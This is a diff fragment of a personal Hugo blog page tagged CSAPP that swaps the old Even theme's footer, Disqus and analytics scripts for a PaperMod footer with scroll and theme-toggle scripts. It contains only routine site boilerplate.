-<span class=item-content>2018-03-22</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/csapp/>CSAPP</a></div><nav class=post-nav><a class=prev href=/post/%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88%E4%B8%8E%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88%E4%B8%8E%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84/><i class="iconfont icon-left"></i>
-<span class="prev-text nav-default">二级指针与二维数组，数组指针与指针数组</span>
-<span class="prev-text nav-mobile">上一篇</span></a>
-<a class=next href=/post/linux-windows%E5%85%B1%E4%BA%AB%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87/><span class="next-text nav-default">linux,windows共享蓝牙设备</span>
-<span class="next-text nav-mobile">下一篇</span>
-<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
-<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
-<span class=division>|</span>
-<span class=theme-info>主题 -
-<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
-<span class=copyright-year>&copy;
-2016 -
-2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
-<script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
-<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
-<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
-<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
+</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/csapp/>CSAPP</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
